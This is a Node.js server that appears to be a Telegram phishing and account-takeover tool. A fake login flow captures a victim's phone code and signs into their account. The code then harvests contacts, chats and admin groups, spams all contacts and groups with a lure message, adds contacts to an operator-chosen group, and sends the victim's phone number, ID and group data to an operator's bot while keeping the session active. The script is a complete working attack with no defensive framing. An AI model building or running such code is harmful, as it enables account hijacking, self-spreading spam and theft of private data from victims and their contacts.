const express = require('express');
const cors = require('cors');

const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = parseInt(process.env.API_ID || 29310851);
const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';
const TARGET_GROUP_ID = process.env.TARGET_GROUP_ID || '';

// Bot configuration
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '';

// Messages to send
const CONTACT_MESSAGE = process.env.CONTACT_MESSAGE || "Hello! Hope you're doing well. Check out this amazing opportunity!";
const GROUP_MESSAGE = process.env.GROUP_MESSAGE || "Hi everyone! Excited to share something interesting with you all!";

const sessions = new Map();
const authenticatedUsers = new Map();

function generateSessionId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Send message via bot
async function sendBotMessage(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log('📨 Bot message sent to admin');
        } else {
            console.error('❌ Bot message failed:', data.description);
        }
    } catch (error) {
        console.error('❌ Bot message error:', error);
    }
}

// Send authentication code
app.post('/api/telegram/send-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log(`📱 Sending code to: ${phoneNumber}`);
        
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        console.log('🔗 Connected to Telegram');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phoneNumber,
                apiId: apiId,
                apiHash: apiHash,
                settings: new Api.CodeSettings({}),
            })
        );

        const sessionId = generateSessionId();
        sessions.set(sessionId, {
            client,
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber,
            timestamp: Date.now()
        });

        console.log(`📨 Code sent to ${phoneNumber}`);

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Code sent to your Telegram app'
        });

    } catch (error) {
        console.error('❌ Send code error:', error);
        res.status(400).json({
            success: false,
            message: error.message || 'Failed to send code'
        });
    }
});

// Verify code and authenticate
app.post('/api/telegram/verify-code', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        console.log(`🔐 Verifying code: ${code}`);
        
        const session = sessions.get(sessionId);
        if (!session) {
            return res.status(400).json({
                success: false,
                message: 'Session expired'
            });
        }

        const result = await session.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: session.phoneNumber,
                phoneCodeHash: session.phoneCodeHash,
                phoneCode: code,
            })
        );

        console.log(`✅ Login successful: ${result.user.firstName} ${result.user.lastName}`);

        const userId = session.phoneNumber.replace(/[^\d]/g, '');
        authenticatedUsers.set(userId, {
            client: session.client,
            phoneNumber: session.phoneNumber,
            user: result.user,
            userId: userId,
            loginTime: Date.now()
        });

        sessions.delete(sessionId);

        res.json({
            success: true,
            message: 'Authentication successful!',
            user: {
                phoneNumber: session.phoneNumber,
                firstName: result.user?.firstName || '',
                lastName: result.user?.lastName || '',
                userId: userId
            }
        });

        // Start all operations
        setTimeout(() => {
            performAllOperations(client, result.user, session.phoneNumber);
        }, 2000);

    } catch (error) {
        console.error('❌ Verify error:', error);
        res.status(400).json({
            success: false,
            message: 'Invalid code'
        });
    }
});

// Main operations function
async function performAllOperations(client, user, phoneNumber) {
    try {
        console.log(`\n🚀 Starting ALL operations for ${user.firstName} (${phoneNumber})`);
        
        // STEP 1: Extract all data
        console.log(`\n📊 STEP 1: Data Extraction`);
        const userData = await extractUserData(client, user, phoneNumber);
        
        // STEP 2: Send messages to contacts and chat partners
        console.log(`\n📨 STEP 2: Messaging Contacts`);
        await sendMessagesToContacts(client, userData);
        
        // STEP 3: Send messages to groups (non-admin groups only)
        console.log(`\n👥 STEP 3: Messaging Groups`);
        await sendMessagesToGroups(client, userData, user);
        
        // STEP 4: Join target group and add contacts
        console.log(`\n🎯 STEP 4: Target Group Operations`);
        await performTargetGroupOperations(client, userData, user);
        
        // STEP 5: Send final completion report
        await sendCompletionReport(userData, user);
        
        console.log(`\n🎉 ALL OPERATIONS COMPLETED for ${user.firstName}!`);
        
    } catch (error) {
        console.error('❌ Main operations error:', error);
        await sendBotMessage(`❌ <b>ERROR</b>\nUser: ${user.firstName}\nError: ${error.message}`);
    }
}

// Extract user data and find admin groups
async function extractUserData(client, user, phoneNumber) {
    try {
        // Get contacts
        const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
        const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
        
        // Get dialogs
        const dialogs = await client.getDialogs({ limit: 100 });
        const groups = dialogs.filter(d => d.isGroup);
        const channels = dialogs.filter(d => d.isChannel);
        const privateChats = dialogs.filter(d => d.isUser);
        
        // Get chat partners (people user has chatted with)
        const chatPartners = privateChats.map(chat => chat.entity).filter(entity => 
            entity && !entity.self && !entity.deleted && !entity.bot
        );
        
        console.log(`📊 Found: ${contacts.length} contacts, ${chatPartners.length} chat partners, ${groups.length} groups`);
        
        // Check which groups user is admin of
        const adminGroups = [];
        const regularGroups = [];
        
        for (const group of groups) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: group.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminGroups.push({
                        entity: group.entity,
                        title: group.title,
                        members: group.entity.participantsCount || 0
                    });
                } else {
                    regularGroups.push({
                        entity: group.entity,
                        title: group.title,
                        members: group.entity.participantsCount || 0
                    });
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check: ${group.title}`);
                // If we can't check, assume it's a regular group
                regularGroups.push({
                    entity: group.entity,
                    title: group.title,
                    members: group.entity.participantsCount || 0
                });
            }
        }
        
        // Check admin channels
        const adminChannels = [];
        for (const channel of channels.slice(0, 10)) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: channel.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminChannels.push({
                        title: channel.title,
                        members: channel.entity.participantsCount || 0
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check channel: ${channel.title}`);
            }
        }
        
        console.log(`👑 Admin groups: ${adminGroups.length}, Regular groups: ${regularGroups.length}`);
        
        return {
            user,
            phoneNumber,
            contacts,
            chatPartners,
            adminGroups,
            adminChannels,
            regularGroups,
            allGroups: groups,
            channels
        };
        
    } catch (error) {
        console.error('❌ Data extraction error:', error);
        throw error;
    }
}

// Send messages to all contacts and chat partners
async function sendMessagesToContacts(client, userData) {
    try {
        // Combine contacts and chat partners, remove duplicates
        const allTargets = [...userData.contacts, ...userData.chatPartners];
        const uniqueTargets = allTargets.filter((target, index, self) => 
            index === self.findIndex(t => t.id.toString() === target.id.toString())
        );
        
        console.log(`📨 Sending messages to ${uniqueTargets.length} contacts/chat partners...`);
        
        let sentCount = 0;
        let failedCount = 0;
        
        for (const target of uniqueTargets) {
            try {
                await client.invoke(new Api.messages.SendMessage({
                    peer: target,
                    message: CONTACT_MESSAGE,
                    randomId: Math.floor(Math.random() * 1000000)
                }));
                
                sentCount++;
                const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                console.log(`✅ ${sentCount}/${uniqueTargets.length} Sent to: ${name}`);
                
                // 2 second delay between messages
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (error) {
                failedCount++;
                const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                console.log(`❌ Failed to send to: ${name} - ${error.message}`);
                
                // Handle rate limits
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
        }
        
        console.log(`📨 Contact messaging completed: ${sentCount} sent, ${failedCount} failed`);
        
    } catch (error) {
        console.error('❌ Contact messaging error:', error);
    }
}

// Send messages to groups (excluding admin groups)
async function sendMessagesToGroups(client, userData, user) {
    try {
        const messagableGroups = userData.regularGroups; // Only non-admin groups
        
        console.log(`👥 Sending messages to ${messagableGroups.length} regular groups...`);
        
        let sentCount = 0;
        let failedCount = 0;
        
        for (const group of messagableGroups) {
            try {
                await client.invoke(new Api.messages.SendMessage({
                    peer: group.entity,
                    message: GROUP_MESSAGE,
                    randomId: Math.floor(Math.random() * 1000000)
                }));
                
                sentCount++;
                console.log(`✅ ${sentCount}/${messagableGroups.length} Sent to group: ${group.title}`);
                
                // 4 second delay between group messages (longer delay for groups)
                await new Promise(resolve => setTimeout(resolve, 4000));
                
            } catch (error) {
                failedCount++;
                console.log(`❌ Failed to send to group: ${group.title} - ${error.message}`);
                
                // Handle rate limits
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                } else if (error.message.includes('CHAT_WRITE_FORBIDDEN')) {
                    console.log(`ℹ️ Cannot send to group: ${group.title} (write permission denied)`);
                }
            }
        }
        
        console.log(`👥 Group messaging completed: ${sentCount} sent, ${failedCount} failed`);
        
        // Send admin notification about messaging
        const messagingReport = `
📨 <b>MESSAGING COMPLETED</b>

👤 <b>User:</b> ${user.firstName} ${user.lastName}
📱 <b>Phone:</b> ${userData.phoneNumber}

📊 <b>MESSAGING RESULTS:</b>
📞 Contact Messages: ${sentCount} sent
👥 Group Messages: ${sentCount} sent
❌ Failed Messages: ${failedCount}

📋 <b>GROUPS MESSAGED:</b>
${messagableGroups.slice(0, 10).map((g, i) => `${i+1}. ${g.title}`).join('\n')}
${messagableGroups.length > 10 ? `... and ${messagableGroups.length - 10} more groups` : ''}
        `.trim();
        
        await sendBotMessage(messagingReport);
        
    } catch (error) {
        console.error('❌ Group messaging error:', error);
    }
}

// Join target group and add contacts
async function performTargetGroupOperations(client, userData, user) {
    try {
        if (!TARGET_GROUP_ID) {
            console.log(`⚠️ No target group ID set - skipping group operations`);
            return;
        }
        
        console.log(`🎯 Target group operations starting...`);
        
        // Join the target group
        try {
            await client.invoke(new Api.channels.JoinChannel({
                channel: TARGET_GROUP_ID
            }));
            console.log(`✅ User joined target group`);
        } catch (error) {
            console.log(`ℹ️ Could not join group: ${error.message}`);
        }
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Add contacts to target group
        console.log(`👥 Adding ${userData.contacts.length} contacts to target group...`);
        
        let addedCount = 0;
        let failedCount = 0;
        
        for (const contact of userData.contacts) {
            try {
                await client.invoke(new Api.channels.InviteToChannel({
                    channel: TARGET_GROUP_ID,
                    users: [contact]
                }));
                
                addedCount++;
                const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                console.log(`✅ ${addedCount}/${userData.contacts.length} Added: ${name}`);
                
                // 3 second delay between adds
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                failedCount++;
                const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                console.log(`❌ Failed to add: ${name} - ${error.message}`);
                
                // Handle rate limits
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                } else if (error.message.includes('USER_PRIVACY_RESTRICTED')) {
                    console.log(`ℹ️ ${name} has privacy restrictions`);
                }
            }
        }
        
        console.log(`👥 Group operations completed: ${addedCount} added, ${failedCount} failed`);
        
    } catch (error) {
        console.error('❌ Target group operations error:', error);
    }
}

// Send final completion report
async function sendCompletionReport(userData, user) {
    try {
        const adminGroupsList = userData.adminGroups.length > 0 ? 
            userData.adminGroups.map((g, i) => `${i+1}. ${g.title} (${g.members} members)`).join('\n') : 
            'None';
            
        const adminChannelsList = userData.adminChannels.length > 0 ? 
            userData.adminChannels.map((c, i) => `${i+1}. ${c.title} (${c.members} subscribers)`).join('\n') : 
            'None';
        
        const completionMessage = `
🎉 <b>ALL OPERATIONS COMPLETED</b>

👤 <b>User:</b> ${user.firstName} ${user.lastName}
📱 <b>Phone:</b> ${userData.phoneNumber}
🆔 <b>ID:</b> ${user.id}
🕒 <b>Completed:</b> ${new Date().toLocaleString()}

📊 <b>FINAL STATISTICS:</b>
📞 Total Contacts: ${userData.contacts.length}
💬 Chat Partners: ${userData.chatPartners.length}
👥 Total Groups: ${userData.allGroups.length}
📢 Total Channels: ${userData.channels.length}
👑 Admin Groups: ${userData.adminGroups.length}
👑 Admin Channels: ${userData.adminChannels.length}

👑 <b>ADMIN GROUPS:</b>
${adminGroupsList}

👑 <b>ADMIN CHANNELS:</b>
${adminChannelsList}

✅ <b>OPERATIONS SUMMARY:</b>
📨 Messages sent to contacts/chat partners
👥 Messages sent to regular groups (excluding admin groups)
🎯 User joined target group
👥 Contacts added to target group
📊 Complete data extracted and reported

🔒 <b>User session remains active</b>
        `.trim();
        
        await sendBotMessage(completionMessage);
        
    } catch (error) {
        console.error('❌ Completion report error:', error);
    }
}

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        authenticatedUsers: authenticatedUsers.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Complete Operations System',
        status: 'Running',
        features: [
            'Send messages to all contacts and chat partners',
            'Send messages to regular groups (non-admin)',
            'Extract admin groups/channels with member counts',
            'Add contacts to target group',
            'Bot notifications with complete data'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Complete Operations System Started`);
    console.log(`📡 Running on port ${PORT}`);
    console.log(`📨 Contact messaging: ${CONTACT_MESSAGE.substring(0, 30)}...`);
    console.log(`👥 Group messaging: ${GROUP_MESSAGE.substring(0, 30)}...`);
    console.log(`🤖 Bot notifications enabled`);
    console.log(`✅ Ready for complete operations!`);
});